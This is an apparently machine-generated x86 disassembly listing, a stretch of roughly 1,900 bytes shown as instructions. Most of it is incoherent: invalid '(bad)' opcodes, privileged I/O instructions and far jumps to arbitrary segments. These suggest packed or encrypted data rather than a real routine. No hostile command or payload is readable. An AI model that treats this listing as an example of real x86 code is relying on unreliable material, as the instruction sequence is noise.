  412b24:	add    DWORD PTR [ecx],ecx
  412b26:	mov    WORD PTR [eax+edi*8-0x19],gs
  412b2a:	scas   eax,DWORD PTR es:[edi]
  412b2b:	leave  
  412b2c:	jp     0x412b9c
  412b2e:	xchg   esi,eax
  412b2f:	sbb    esp,ebx
  412b31:	(bad)  
  412b32:	in     al,dx
  412b33:	xchg   edi,eax
  412b34:	dec    ebp
  412b35:	repnz lock fist WORD PTR [eax]
  412b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b3a:	lahf   
  412b3b:	fmulp  st(6),st
  412b3d:	push   0x1f
  412b3f:	lds    edx,FWORD PTR [ebp+0x533f87f8]
  412b45:	aas    
  412b46:	jo     0x412af5
  412b48:	sbb    ah,BYTE PTR [edx+0x3c46a312]
  412b4e:	bound  eax,QWORD PTR [ebx+0x5e7bd438]
  412b54:	sahf   
  412b55:	fistp  DWORD PTR [esi+0x6dbec901]
  412b5b:	mov    BYTE PTR [eax-0x67],bl
  412b5e:	pop    esi
  412b5f:	leave  
  412b60:	mov    ebx,0xff6b29ea
  412b65:	mov    bl,0x15
  412b67:	and    al,0x33
  412b69:	jno    0x412b2b
  412b6b:	jle    0x412b25
  412b6d:	(bad)  
  412b6e:	and    edi,ecx
  412b70:	and    DWORD PTR [eax],ebx
  412b72:	icebp  
  412b73:	and    al,0x87
  412b75:	and    DWORD PTR [ebp+0x75],esi
  412b78:	sbb    al,0x73
  412b7a:	mov    ds:0x3e097d70,al
  412b7f:	mov    ds:0x26c9fe81,eax
  412b84:	sub    BYTE PTR [ecx+ecx*8-0x52f666ce],dl
  412b8b:	dec    edx
  412b8c:	inc    eax
  412b8d:	shl    DWORD PTR [ebp-0x41f17494],0xbf
  412b94:	push   cs
  412b95:	jecxz  0x412b3b
  412b97:	push   esi
  412b98:	cmp    eax,0x73afcdb7
  412b9d:	dec    edx
  412b9e:	add    al,0x37
  412ba0:	fldcw  WORD PTR [eax+0x443e26ce]
  412ba6:	in     al,0xc7
  412ba8:	daa    
  412ba9:	fcomp  QWORD PTR [edx]
  412bab:	pop    ebx
  412bac:	push   ebx
  412bad:	jne    0x412bb4
  412baf:	xor    DWORD PTR [esi+0x4d],eax
  412bb2:	push   ds
  412bb3:	sub    eax,DWORD PTR [edi-0x13]
  412bb6:	ja     0x412c1c
  412bb8:	mov    ebp,0x7dd04a53
  412bbd:	jge    0x412c36
  412bbf:	sub    ch,BYTE PTR [ecx+0x3d6ef51f]
  412bc5:	popf   
  412bc6:	clc    
  412bc7:	mov    esi,0xd815bc46
  412bcc:	push   es
  412bcd:	push   ecx
  412bce:	loope  0x412c2a
  412bd0:	cmp    ebx,esi
  412bd2:	(bad)  [ebp+0x52]
  412bd5:	iret   
  412bd6:	mov    edi,eax
  412bd8:	pop    es
  412bd9:	stos   BYTE PTR es:[edi],al
  412bda:	rsm    
  412bdc:	cmp    BYTE PTR [edx-0x2cc9ffbd],al
  412be2:	mov    edi,0x4b0a11b0
  412be7:	mov    BYTE PTR [edx+0x6efc0b7f],dh
  412bed:	call   FWORD PTR [edi-0x6d]
  412bf0:	test   BYTE PTR [edx-0x7bebd447],ah
  412bf6:	mov    ah,0xce
  412bf8:	xor    bh,BYTE PTR ds:0xf5dfac28
  412bfe:	sbb    eax,0x9f575be9
  412c03:	jo     0x412be2
  412c05:	int    0x53
  412c07:	ffree  st(2)
  412c09:	dec    ebx
  412c0a:	addr16 out 0xdc,eax
  412c0d:	or     al,0x71
  412c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c10:	imul   edi,DWORD PTR [ebx+edx*4],0xbc55333
  412c17:	lahf   
  412c18:	cld    
  412c19:	pop    es
  412c1a:	and    al,0x93
  412c1c:	jmp    0xdda6:0xc99fc41f
  412c23:	(bad)  [ebx+0x12bdd690]
  412c29:	loop   0x412c70
  412c2b:	mov    dh,0x82
  412c2d:	je     0x412bff
  412c2f:	or     ecx,edi
  412c31:	in     al,dx
  412c32:	push   0xffffffac
  412c34:	jmp    0x5c9913a9
  412c39:	pop    ecx
  412c3a:	(bad)  
  412c3b:	cmc    
  412c3c:	mov    BYTE PTR [eax-0x6c1e5b0f],bh
  412c42:	or     eax,DWORD PTR [ecx-0x4d003542]
  412c48:	mov    al,BYTE PTR [esi+0x7a]
  412c4b:	and    eax,0x1a9ff2a6
  412c50:	fldenv [ebx+ebp*1]
  412c53:	mov    esp,0xf8d61450
  412c58:	jp     0x412c52
  412c5a:	adc    al,dh
  412c5c:	nop
  412c5d:	mov    esi,0x234f1357
  412c62:	sub    DWORD PTR [esi-0x2cf2773],eax
  412c68:	or     eax,esi
  412c6a:	and    dh,dh
  412c6c:	mov    ebx,0x1abd2618
  412c71:	fwait
  412c72:	pop    ecx
  412c73:	out    0x41,al
  412c75:	sbb    BYTE PTR [esp+ebx*1-0x10],dh
  412c79:	leave  
  412c7a:	sub    al,BYTE PTR [ecx+0x7c]
  412c7d:	inc    eax
  412c7e:	mov    DWORD PTR [edx+0x10],ebx
  412c81:	adc    eax,0xdefc7f2f
  412c86:	add    DWORD PTR [esi+0x2b],0xffffff9a
  412c8a:	mov    BYTE PTR [ecx],ch
  412c8c:	icebp  
  412c8d:	dec    eax
  412c8e:	push   esi
  412c8f:	(bad)  
  412c90:	and    dh,bh
  412c92:	scas   al,BYTE PTR es:[edi]
  412c93:	call   0xdba3:0xf3dfa3e8
  412c9a:	inc    ebp
  412c9b:	xor    eax,0xacc747d1
  412ca0:	jg     0x412cee
  412ca2:	dec    ecx
  412ca3:	jbe    0x412c75
  412ca5:	test   BYTE PTR [eax-0x40],al
  412ca8:	mov    ah,0xc2
  412caa:	adc    al,0x47
  412cac:	mov    ds:0xb51aa705,al
  412cb1:	(bad)  
  412cb2:	clc    
  412cb3:	out    dx,al
  412cb4:	arpl   WORD PTR [ecx+0xdb0968e],cx
  412cba:	out    0x93,eax
  412cbc:	or     DWORD PTR [eax+0xdcd882],eax
  412cc2:	je     0x412cff
  412cc4:	in     eax,0x1e
  412cc6:	outs   dx,BYTE PTR ds:[esi]
  412cc7:	add    ch,ch
  412cc9:	adc    ecx,ecx
  412ccb:	pop    ss
  412ccc:	mov    DWORD PTR [esi-0x4be66c8],esp
  412cd2:	xchg   esp,eax
  412cd3:	inc    ebp
  412cd4:	pop    edi
  412cd5:	adc    eax,DWORD PTR [eax-0x11]
  412cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cd9:	sbb    DWORD PTR [ecx+0x66c650ae],esi
  412cdf:	sub    al,bl
  412ce1:	rcr    DWORD PTR [eax-0x2cbecc11],0x86
  412ce8:	cmp    DWORD PTR [eax-0x7badc80b],eax
  412cee:	sahf   
  412cef:	shl    ebx,0x98
  412cf2:	sub    ch,BYTE PTR [ebx]
  412cf4:	sbb    DWORD PTR [ecx+0x2d330fa9],eax
  412cfa:	int    0x4b
  412cfc:	add    eax,0x96c20203
  412d01:	mov    esp,0x8bb60ced
  412d06:	add    al,0x8a
  412d08:	ds dec esp
  412d0a:	leave  
  412d0b:	pop    es
  412d0c:	rcr    DWORD PTR [ebx+edx*1+0x246349cf],0xa9
  412d14:	push   es
  412d15:	(bad)  
  412d16:	or     BYTE PTR [ebx+0x4b16c47d],bh
  412d1c:	and    eax,ebp
  412d1e:	inc    esp
  412d1f:	loopne 0x412d04
  412d21:	xchg   ecx,eax
  412d22:	lods   eax,DWORD PTR ds:[esi]
  412d23:	xchg   BYTE PTR [ecx+0x29],dh
  412d26:	add    DWORD PTR [edi+0x44fc0d42],esi
  412d2c:	fidiv  DWORD PTR ds:0x90a7602f
  412d32:	and    BYTE PTR [ebx],dh
  412d34:	es int3 
  412d36:	sub    edi,0xaac2108e
  412d3c:	cdq    
  412d3d:	mov    dh,0x9
  412d3f:	lods   eax,DWORD PTR ds:[esi]
  412d40:	jmp    0x412db9
  412d42:	ror    BYTE PTR [edx+0x618a94cf],0x36
  412d49:	scas   eax,DWORD PTR es:[edi]
  412d4a:	sub    eax,0x8bffe61e
  412d4f:	mov    al,0x28
  412d51:	jo     0x412ce8
  412d53:	stos   BYTE PTR es:[edi],al
  412d54:	push   eax
  412d55:	add    DWORD PTR [esi+0x38],0xc
  412d59:	sbb    edx,DWORD PTR [ebp*2-0x3126cfc8]
  412d60:	shr    DWORD PTR [edx*4-0x492e109a],1
  412d67:	dec    ebp
  412d68:	sbb    bh,BYTE PTR [edx]
  412d6a:	out    dx,eax
  412d6b:	push   ebp
  412d6c:	(bad)  
  412d6d:	aad    0xa9
  412d6f:	fdivrp st(7),st
  412d71:	xor    al,0x11
  412d73:	fwait
  412d74:	push   es
  412d75:	enter  0x12e3,0xdd
  412d79:	mov    ecx,0x2b966444
  412d7e:	loopne 0x412d75
  412d80:	inc    esi
  412d81:	in     eax,0x2f
  412d83:	xchg   edx,eax
  412d84:	adc    BYTE PTR [ebx*2-0x2afb3eef],cl
  412d8b:	xor    al,0x47
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR [ebx],0x3e7cdac4
  412d95:	aaa    
  412d96:	cdq    
  412d97:	or     al,0xc6
  412d99:	stc    
  412d9a:	add    eax,0x62bd4635
  412d9f:	pop    edx
  412da0:	(bad)  [esi]
  412da2:	sbb    ecx,DWORD PTR [esi+eax*1]
  412da5:	inc    ebx
  412da6:	ja     0x412dd4
  412da8:	sar    BYTE PTR [ebx],0xac
  412dab:	data16 stos BYTE PTR es:[edi],al
  412dad:	inc    esi
  412dae:	adc    ebp,DWORD PTR [eax+edi*8-0xbe7ff3c]
  412db5:	jp     0x412dc4
  412db7:	out    0xdb,eax
  412db9:	stc    
  412dba:	mov    al,0x2e
  412dbc:	push   eax
  412dbd:	imul   cl
  412dbf:	inc    esi
  412dc0:	dec    edi
  412dc1:	jg     0x412de6
  412dc3:	bound  eax,QWORD PTR [ebx+0x3a7c8a17]
  412dc9:	pop    edx
  412dca:	mov    ds:0xaacf1ebb,al
  412dcf:	aam    0xc1
  412dd1:	push   esp
  412dd2:	fcom   st(7)
  412dd4:	adc    dl,bh
  412dd6:	mov    al,ds:0x85471456
  412ddb:	pop    eax
  412ddc:	sti    
  412ddd:	jne    0x412e2f
  412ddf:	jmp    0x412db7
  412de1:	imul   edi,DWORD PTR [edi-0x2a91635c],0x67
  412de8:	out    dx,eax
  412de9:	rcr    DWORD PTR [ebp+0x6c],1
  412dec:	cmc    
  412ded:	in     eax,0x79
  412def:	lods   eax,DWORD PTR ds:[esi]
  412df0:	fisub  DWORD PTR [ebx]
  412df2:	push   cs
  412df3:	punpckhbw mm7,QWORD PTR [ecx+0x1f]
  412df7:	(bad)  
  412df8:	sub    al,0x6
  412dfa:	xchg   ebx,eax
  412dfb:	xchg   esp,eax
  412dfc:	mov    ds:0x413f72a6,al
  412e01:	cmp    DWORD PTR [ebx-0x606aceca],0xffffffca
  412e08:	jmp    0x8662a3c5
  412e0d:	loope  0x412e03
  412e0f:	pop    esi
  412e10:	pop    ebp
  412e11:	adc    edx,DWORD PTR [esi]
  412e13:	jp     0x412e4a
  412e15:	out    0x22,eax
  412e17:	sbb    cl,BYTE PTR [ecx+0x2cd04e61]
  412e1d:	sub    eax,0x143ca704
  412e22:	out    dx,al
  412e23:	sbb    edx,edx
  412e25:	mov    cl,0xce
  412e27:	in     al,dx
  412e28:	jl     0x412e7a
  412e2a:	sub    DWORD PTR [eax+0x7d],eax
  412e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e2e:	fistp  WORD PTR [edx]
  412e30:	in     eax,dx
  412e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e32:	xor    BYTE PTR [esi+0x4f375028],cl
  412e38:	imul   ebx,DWORD PTR [ecx+0x16],0x68d95677
  412e3f:	or     al,0x33
  412e41:	and    BYTE PTR [edi+0x277c36eb],bl
  412e47:	aaa    
  412e48:	or     cl,bl
  412e4a:	adc    esi,edx
  412e4c:	xchg   BYTE PTR ds:[edi+0x130be5de],bl
  412e53:	into   
  412e54:	in     al,dx
  412e55:	xor    bl,BYTE PTR [ecx]
  412e57:	mov    WORD PTR [esi+0x1dc9ba89],?
  412e5d:	loope  0x412e1f
  412e5f:	pop    es
  412e60:	and    ebp,DWORD PTR [esi]
  412e62:	scas   eax,DWORD PTR es:[edi]
  412e63:	dec    esi
  412e64:	jo     0x412eab
  412e66:	imul   esi,DWORD PTR [edi],0x5b
  412e69:	mov    DWORD PTR [edx-0x6e],ebx
  412e6c:	mov    edx,0xaccbf8c2
  412e71:	pop    ecx
  412e72:	adc    DWORD PTR [ebp+0x1632fbb1],edi
  412e78:	jmp    0x798:0x1f6887e6
  412e7f:	arpl   WORD PTR [edi],ax
  412e81:	xchg   ebx,eax
  412e82:	test   DWORD PTR [ebx],esi
  412e84:	lea    esp,[eax]
  412e86:	sti    
  412e87:	pop    esi
  412e88:	pushf  
  412e89:	jmp    0x412ed1
  412e8b:	mov    ecx,edi
  412e8d:	ret    0xbbd4
  412e90:	in     eax,dx
  412e91:	jnp    0x412e8d
  412e93:	jne    0x412ec7
  412e95:	xchg   esp,eax
  412e96:	lahf   
  412e97:	shr    DWORD PTR [ebx-0x1b],0xe1
  412e9b:	std    
  412e9c:	adc    al,0x28
  412e9e:	jnp    0x412e54
  412ea0:	ret    0xc824
  412ea3:	or     al,0x9b
  412ea5:	mov    ebx,0xde1a6a62
  412eaa:	or     cl,BYTE PTR [esi]
  412eac:	adc    esp,DWORD PTR [edx]
  412eae:	sbb    edi,DWORD PTR [ebp+0x9e16257]
  412eb4:	repz or eax,0x1c5ec22b
  412eba:	out    dx,eax
  412ebb:	pop    eax
  412ebc:	pop    edx
  412ebd:	mov    al,ds:0x6159565e
  412ec2:	test   DWORD PTR [ebx-0x7a20e268],esi
  412ec8:	fiadd  WORD PTR [ecx-0x5e351f77]
  412ece:	jp     0x412eb4
  412ed0:	fucomip st,st(5)
  412ed2:	xor    dh,BYTE PTR [ebp+0x1b]
  412ed5:	in     al,0x29
  412ed7:	push   esi
  412ed8:	shl    DWORD PTR [edx],cl
  412eda:	or     eax,0x38e7f1c
  412edf:	dec    edx
  412ee0:	(bad)  
  412ee1:	psubusb mm4,mm2
  412ee4:	int3   
  412ee5:	xlat   BYTE PTR ds:[ebx]
  412ee6:	mov    BYTE PTR ds:0x8ed0893d,dl
  412eec:	xor    bh,BYTE PTR [edx-0x38]
  412eef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ef0:	inc    edx
  412ef1:	dec    eax
  412ef2:	daa    
  412ef3:	imul   edx,edi,0x9cdda07b
  412ef9:	or     eax,ebp
  412efb:	mov    ecx,0xae66d58e
  412f00:	test   al,0xa4
  412f02:	push   ds
  412f03:	jnp    0x412ea2
  412f05:	or     BYTE PTR [ecx-0x63],al
  412f08:	or     BYTE PTR [ebp-0x5d],al
  412f0b:	ds daa 
  412f0d:	(bad)  
  412f0e:	fneni(8087 only) 
  412f10:	xlat   BYTE PTR ds:[ebx]
  412f11:	xchg   edx,eax
  412f12:	int    0x37
  412f14:	scas   al,BYTE PTR es:[edi]
  412f15:	out    dx,eax
  412f16:	add    BYTE PTR [ebx-0x4a0f4474],dl
  412f1c:	neg    DWORD PTR [ebx-0x3cc6d31]
  412f22:	pop    edi
  412f23:	repz les esp,FWORD PTR ds:0x65e2aeb4
  412f2a:	arpl   WORD PTR [esi-0x337e86ac],sp
  412f30:	pop    eax
  412f31:	(bad)  
  412f33:	leave  
  412f34:	popa   
  412f35:	adc    BYTE PTR [esi],al
  412f37:	jecxz  0x412f2c
  412f39:	jecxz  0x412fa7
  412f3b:	int3   
  412f3c:	or     esi,edx
  412f3e:	repz pop esp
  412f40:	retf   
  412f41:	inc    esi
  412f42:	in     al,0xed
  412f44:	test   DWORD PTR [ebp+0x3e],ecx
  412f47:	dec    eax
  412f48:	cld    
  412f49:	mov    eax,0xf81b7e6a
  412f4e:	es (bad) 
  412f50:	mov    al,0x5a
  412f52:	stos   DWORD PTR es:[edi],eax
  412f53:	fwait
  412f54:	push   ecx
  412f55:	sbb    DWORD PTR [edx*1+0x1ea93a54],0xffffffd0
  412f5d:	les    edx,FWORD PTR [ebp+edi*4-0x57]
  412f61:	push   ss
  412f62:	bound  ecx,QWORD PTR [ebx-0x30]
  412f65:	mov    ds:0xb9b105f0,eax
  412f6a:	jne    0x412f6d
  412f6c:	repz jb 0x412fac
  412f6f:	lahf   
  412f70:	dec    DWORD PTR [ebp+ecx*4+0x5]
  412f74:	inc    ecx
  412f75:	sbb    ecx,ebx
  412f77:	data16 mov al,BYTE PTR ds:0xf966488b
  412f7e:	or     al,0x9c
  412f80:	sti    
  412f81:	inc    ebp
  412f82:	shr    DWORD PTR [edi+ecx*2],0xee
  412f86:	pop    ebp
  412f87:	dec    esp
  412f88:	les    edx,FWORD PTR [ecx+0x9be7ab0]
  412f8e:	sbb    DWORD PTR [esi+0x4990852b],edi
  412f94:	pop    ebx
  412f95:	push   edi
  412f96:	sub    BYTE PTR [ebx+0xb1b5fcb],0xfe
  412f9d:	int    0x11
  412f9f:	and    bh,BYTE PTR [edx]
  412fa1:	adc    BYTE PTR [edx+eax*1],bh
  412fa4:	jmp    0xe7cfda57
  412fa9:	jmp    0xf750:0xf178c7e3
  412fb0:	adc    BYTE PTR [edx],0x66
  412fb3:	inc    edi
  412fb4:	inc    ecx
  412fb5:	push   0x1b
  412fb7:	addr16 pop ecx
  412fb9:	test   al,0x7a
  412fbb:	jl     0x412f62
  412fbd:	std    
  412fbe:	outs   dx,BYTE PTR ds:[esi]
  412fbf:	imul   ebp,DWORD PTR [eax+eiz*1+0x394dc010],0xffffffc2
  412fc7:	mov    ch,0x6d
  412fc9:	dec    edi
  412fca:	mov    bl,0x48
  412fcc:	adc    BYTE PTR [eax+0x22],al
  412fcf:	unpckhps xmm7,XMMWORD PTR [ebx-0x24]
  412fd3:	(bad)  
  412fd4:	ds pop ebx
  412fd6:	mov    ebp,DWORD PTR [ecx]
  412fd8:	or     DWORD PTR [esi-0x24],0xffffff92
  412fdc:	mov    cl,0xd3
  412fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fe0:	sbb    al,0xa0
  412fe2:	das    
  412fe3:	push   0xec7919f0
  412fe8:	push   cs
  412fe9:	out    0x11,eax
  412feb:	cmp    dl,dl
  412fed:	add    DWORD PTR [esi],edx
  412fef:	stos   BYTE PTR es:[edi],al
  412ff0:	ret    0x5eb0
  412ff3:	retf   
  412ff4:	fwait
  412ff5:	push   edi
  412ff6:	mov    esi,0xb186c185
  412ffb:	shr    edi,1
  412ffd:	sbb    dl,bl
  412fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413000:	lds    esp,FWORD PTR [esi]
  413002:	aam    0xd0
  413004:	sub    al,0x92
  413006:	test   DWORD PTR ds:0xda28e781,esi
  41300c:	les    edi,FWORD PTR [esi-0x40]
  41300f:	scas   eax,DWORD PTR es:[edi]
  413010:	pop    ecx
  413011:	adc    eax,0xc917f5ae
  413016:	in     al,0x7f
  413018:	pop    ds
  413019:	aas    
  41301a:	ins    DWORD PTR es:[edi],dx
  41301b:	lock cmc 
  41301d:	lds    esp,FWORD PTR [edx-0x1ca46681]
  413023:	push   esp
  413024:	mov    ebp,0x1bf0af30
  413029:	scas   eax,DWORD PTR es:[edi]
  41302a:	outs   dx,BYTE PTR ds:[esi]
  41302b:	mov    ?,WORD PTR [edi]
  41302d:	je     0x4130ae
  41302f:	cli    
  413030:	pop    ecx
  413031:	add    al,0xee
  413033:	dec    esp
  413034:	dec    ebx
  413035:	into   
  413036:	in     al,dx
  413037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413038:	mov    WORD PTR [edi+0x3b],cs
  41303b:	bound  edi,QWORD PTR [edx]
  41303d:	xlat   BYTE PTR ds:[ebx]
  41303e:	mov    esi,0xaec08868
  413043:	mov    bh,0x44
  413045:	fcmovbe st,st(5)
  413047:	repz (bad) 
  413049:	adc    bh,ah
  41304b:	cmp    al,0x72
  41304d:	xchg   esi,eax
  41304e:	repz sbb DWORD PTR [edx+0x3fd5629a],edx
  413055:	shl    BYTE PTR ds:0xa437ccbc,cl
  41305b:	sar    BYTE PTR [esi+0x7f663ff9],0x6f
  413062:	inc    eax
  413063:	mov    gs,edx
  413065:	movaps XMMWORD PTR [ecx+esi*8-0x50330c5c],xmm7
  41306d:	xchg   esp,eax
  41306e:	imul   ecx,DWORD PTR [eax+0x27],0xf76374be
  413075:	mov    ebx,DWORD PTR [eax-0x17e98011]
  41307b:	jp     0x413057
  41307d:	push   es
  41307e:	iret   
  41307f:	xchg   edi,eax
  413080:	in     al,dx
  413081:	leave  
  413082:	xchg   esp,eax
  413083:	inc    ecx
  413084:	sbb    BYTE PTR ds:0xe2ee9e25,ch
  41308a:	pop    ecx
  41308b:	and    esi,DWORD PTR [ebp*1+0x26d90605]
  413092:	stos   DWORD PTR es:[edi],eax
  413093:	inc    eax
  413094:	add    esi,ecx
  413096:	rol    DWORD PTR gs:[ebp+esi*1+0x26],cl
  41309b:	push   edi
  41309c:	lock pop edx
  41309e:	sub    al,0x49
  4130a0:	aad    0xd4
  4130a2:	inc    eax
  4130a3:	fisttp QWORD PTR [eax-0x447c2372]
  4130a9:	punpcklbw mm0,DWORD PTR [ebp+0x2d]
  4130ad:	ret    
  4130ae:	sbb    eax,0x4195c95d
  4130b3:	pop    es
  4130b4:	push   edx
  4130b5:	mov    ch,0x77
  4130b7:	cwde   
  4130b8:	gs push edx
  4130ba:	inc    esp
  4130bb:	mov    edi,0x72630c37
  4130c0:	into   
  4130c1:	ds hlt 
  4130c3:	inc    BYTE PTR ds:0xd3f345a9
  4130c9:	int3   
  4130ca:	pop    ebp
  4130cb:	push   edi
  4130cc:	aam    0x63
  4130ce:	inc    esp
  4130cf:	in     eax,0xb3
  4130d1:	imul   ebp,DWORD PTR [ecx-0xf10f3ef],0x27
  4130d8:	(bad)  
  4130d9:	jmp    0x9ee17339
  4130de:	std    
  4130df:	pop    ds
  4130e0:	sbb    al,0x70
  4130e2:	mov    edx,0xe503ab33
  4130e7:	mov    bh,BYTE PTR [esi]
  4130e9:	loop   0x413131
  4130eb:	mov    ebp,0x8aac23bb
  4130f0:	cwde   
  4130f1:	data16 fimul WORD PTR [edi+edi*1+0x59]
  4130f6:	(bad)  
  4130f7:	clc    
  4130f8:	in     al,dx
  4130f9:	push   esi
  4130fa:	and    DWORD PTR [edx-0x74b86a4d],esi
  413100:	xchg   ecx,eax
  413101:	xlat   BYTE PTR es:[ebx]
  413103:	mov    es,WORD PTR [ecx+0x1033d226]
  413109:	xchg   edx,eax
  41310a:	(bad)  
  41310c:	jp     0x413123
  41310e:	pop    ebp
  41310f:	clc    
  413110:	pop    edi
  413111:	sbb    al,0x71
  413113:	and    ebp,esi
  413115:	call   0xccf8:0xc84bd93e
  41311c:	mov    ebx,0x377385ba
  413121:	dec    ecx
  413122:	push   ecx
  413123:	pop    ebp
  413124:	das    
  413125:	adc    al,0xdf
  413127:	jb     0x413149
  413129:	dec    ecx
  41312a:	mov    ah,0x5b
  41312c:	fsubr  DWORD PTR [edi+edi*8-0x17b961a]
  413133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413134:	pop    esp
  413135:	jmp    0x413193
  413137:	into   
  413138:	jp     0x4130e5
  41313a:	repz stc 
  41313c:	cmp    al,0xec
  41313e:	jmp    0x14afba6f
  413143:	sub    bh,BYTE PTR [esi+0x6]
  413146:	or     al,0x7a
  413148:	xchg   esp,eax
  413149:	sub    eax,0x8c0aa6d4
  41314e:	lahf   
  41314f:	(bad)  
  413150:	push   edi
  413151:	mov    bl,0x8a
  413153:	in     al,0xf2
  413155:	dec    esi
  413156:	pop    ds
  413157:	mov    esi,0x6109d182
  41315c:	and    BYTE PTR [edx+0x61],dl
  41315f:	cld    
  413160:	pop    ds
  413161:	icebp  
  413162:	jp     0x4131ba
  413164:	inc    edi
  413165:	cmp    BYTE PTR [ecx],0x63
  413168:	clc    
  413169:	test   al,0xd7
  41316b:	sbb    al,0x47
  41316d:	jbe    0x413160
  41316f:	xchg   esi,eax
  413170:	nop
  413171:	(bad)  
  413172:	pusha  
  413173:	jp     0x4131e7
  413175:	or     al,0x5
  413177:	cmp    DWORD PTR [edx+0x27],edx
  41317a:	sub    bl,BYTE PTR [ecx-0x2b]
  41317d:	push   esi
  41317e:	sbb    bl,ah
  413180:	(bad)  
  413181:	fcomi  st,st(7)
  413183:	mov    al,0x1
  413185:	add    eax,0x55f817b
  41318a:	pop    es
  41318b:	xor    cl,BYTE PTR [edi+0x1]
  41318e:	adc    BYTE PTR [eax+0x0],bh
  413191:	sub    dh,BYTE PTR [esi-0x8]
  413194:	jmp    0x327e:0xc195a677
  41319b:	clc    
  41319c:	lods   eax,DWORD PTR ds:[esi]
  41319d:	pop    edi
  41319e:	lods   al,BYTE PTR ds:[esi]
  41319f:	enter  0xaf35,0xdd
  4131a3:	mov    ds:0x232f7184,al
  4131a8:	mov    edi,DWORD PTR [edx-0x37]
  4131ab:	or     ah,BYTE PTR [edi+ebp*1-0x4e]
  4131af:	xchg   ebp,eax
  4131b0:	es push esi
  4131b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b3:	mov    esp,0xff50d84e
  4131b8:	sub    eax,0x1ff49aab
  4131bd:	push   ds
  4131be:	xchg   DWORD PTR [eax],ebx
  4131c0:	fs scas eax,DWORD PTR es:[edi]
  4131c2:	adc    al,al
  4131c4:	lea    ebx,[ecx-0x65e13807]
  4131ca:	mov    dl,0x3d
  4131cc:	mov    ecx,0x876279fd
  4131d1:	sbb    ecx,edx
  4131d3:	pop    ebx
  4131d4:	dec    esi
  4131d5:	jg     0x41322a
  4131d7:	push   edi
  4131d8:	scas   al,BYTE PTR es:[edi]
  4131d9:	pusha  
  4131da:	push   esp
  4131db:	loopne 0x4131e5
  4131dd:	pop    es
  4131de:	idiv   BYTE PTR [edi+0x4a]
  4131e1:	addr16 mov ecx,edx
  4131e4:	cs pop eax
  4131e6:	psrld  mm2,mm5
  4131e9:	mov    ebp,0xa880f17d
  4131ee:	and    al,0xbf
  4131f0:	sahf   
  4131f1:	mov    dl,BYTE PTR [edx+ebp*8]
  4131f4:	lds    edx,FWORD PTR [eax+edx*2+0x5ca06783]
  4131fb:	or     DWORD PTR [edx-0x4a77b0b0],ebp
  413201:	xchg   ebx,eax
  413202:	int3   
  413203:	or     DWORD PTR [edi],ebx
  413205:	int3   
  413206:	cmp    al,bh
  413208:	xchg   ebp,eax
  413209:	cwde   
  41320a:	mov    dl,0xc5
  41320c:	in     eax,0xc1
  41320e:	je     0x4131bc
  413210:	test   eax,0x4b0ecf94
  413215:	jge    0x4131b4
  413217:	jno    0x41326f
  413219:	imul   ebp,DWORD PTR [esi-0x79aa4272],0x862738ed
  413223:	lods   eax,DWORD PTR ds:[esi]
  413224:	jb     0x41320a
  413226:	(bad)  [ebx]
  413228:	stos   DWORD PTR es:[edi],eax
  413229:	mov    cl,0x55
  41322b:	pusha  
  41322c:	popa   
  41322d:	ret    0x7712
  413230:	add    esi,DWORD PTR [eax+0x3601c391]
  413236:	sbb    ah,BYTE PTR [eax]
  413238:	(bad)  
  41323a:	adc    eax,0x17566e00
  41323f:	cmp    ch,0x85
  413242:	inc    esp
  413243:	push   cs
  413244:	jbe    0x413264
  413246:	stos   BYTE PTR es:[edi],al
  413247:	(bad)  
  413248:	mov    dl,0x82
  41324a:	out    dx,al
  41324b:	pop    ss
  41324c:	xchg   ecx,eax
  41324d:	rol    DWORD PTR [edx-0x1b],0xc9
  413251:	or     al,0x2d
  413253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413254:	nop
  413255:	fld    QWORD PTR [esi]
  413257:	adc    eax,0xe7749bce
  41325c:	sub    dh,BYTE PTR [ebp-0x14]
  41325f:	cmp    BYTE PTR [ebp-0x3e3d2677],cl
  413265:	mov    al,0xf7
  413267:	cmp    DWORD PTR [eax],0xffffff89
  41326a:	std    
  41326b:	jle    0x4132e8
  41326d:	xchg   edx,eax
  41326e:	pop    esp
  41326f:	out    dx,eax
  413270:	dec    ebx
  413271:	in     eax,0xab
  413273:	mov    ch,0x13
  413275:	stc    
  413276:	and    edx,DWORD PTR [eax+0x32]
  413279:	dec    esi
  41327a:	adc    eax,0xa2b45b26
  41327f:	popf   
  413280:	retf   0xbef3
  413283:	inc    ecx
  413284:	shl    DWORD PTR [eax-0x29780e75],cl
  41328a:	mov    bl,0x26
  41328c:	pop    edx
  41328d:	push   ss
  41328e:	cmp    esi,ebp
  413290:	cmc    
  413291:	in     eax,dx
  413292:	scas   eax,DWORD PTR es:[edi]
  413293:	xor    esp,DWORD PTR [esp+eax*2+0x1e]
  413297:	div    DWORD PTR [ecx]
  413299:	dec    edi
  41329a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41329b:	jmp    0x4132df
  41329d:	add    al,0x90
  41329f:	in     eax,dx
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	in     al,0x5f
  4132a3:	add    al,ah
  4132a5:	mov    esi,0x6bda577c
  4132aa:	push   esp
  4132ab:	adc    al,0x3d
  4132ad:	cli    
  4132ae:	out    0x50,eax
  4132b0:	fisubr WORD PTR [esi+0x3edb63fe]
  4132b6:	mov    al,ds:0x4972a87d
  4132bb:	mov    ah,0xd1
  4132bd:	mov    esi,0x475b968f
  4132c2:	jmp    0xfc87:0x57402052
  4132c9:	aaa    
  4132ca:	retf   0x396
  4132cd:	fmul   QWORD PTR [edx]
  4132cf:	pop    ebx
  4132d0:	push   cs
  4132d1:	jmp    0xae6335b7
